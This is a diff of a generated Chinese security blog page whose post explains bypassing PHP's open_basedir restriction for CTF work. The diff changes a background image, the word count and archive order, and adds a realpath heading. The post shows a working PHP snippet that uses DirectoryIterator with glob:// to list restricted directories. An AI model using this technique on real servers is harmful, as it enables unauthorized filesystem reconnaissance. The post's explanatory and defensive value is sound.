@@ -241,7 +241,7 @@ height:50vh;
     <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post2.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">253</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">272</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -404,7 +404,8 @@ height:50vh;
         <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>之前在出国赛题的时候，设置<code>open_basedir</code>的时候突发奇想，可不可以绕过<code>open_basedir</code>呢，谷歌了一波，发现确实有不少的tricks，遂来总结一波  </p>
 <h4 id="DirectoryIterator-Glob列目录"><a href="#DirectoryIterator-Glob列目录" class="headerlink" title="DirectoryIterator + Glob列目录"></a>DirectoryIterator + Glob列目录</h4><p>DirectoryIterator是一个php提供的用于查看文件系统目录的一个接口，调用它是可以直接看到文件目录的，但是如果我们设置了<code>open_basedir</code>的时候，用它列举不允许的目录，就会直接导致服务器500<br>glob是自php5.3起用来查找匹配的文件路径模式的一个流包装器<br>当他们组合一起的时候就很炫了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'open_basedir: %s &lt;/br&gt;'</span>,ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p><img src="/assets/opendir/1.png" alt=""><br>可以看到，成功地列出了目录了，这个漏洞直到php7还能用，测试环境是linux+php7（摇头.gif  </p>
-<h4 id="realpath列目录"><a href="#realpath列目录" class="headerlink" title="realpath列目录"></a>realpath列目录</h4>
+<h4 id="realpath列目录"><a href="#realpath列目录" class="headerlink" title="realpath列目录"></a>realpath列目录</h4><p>realpath是php中一个将相对路径转化为绝对路径的方法  </p>
+
     </article>
     <!-- license  -->
     
@@ -542,6 +543,20 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1406,12 +1421,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
         </li>
     
     
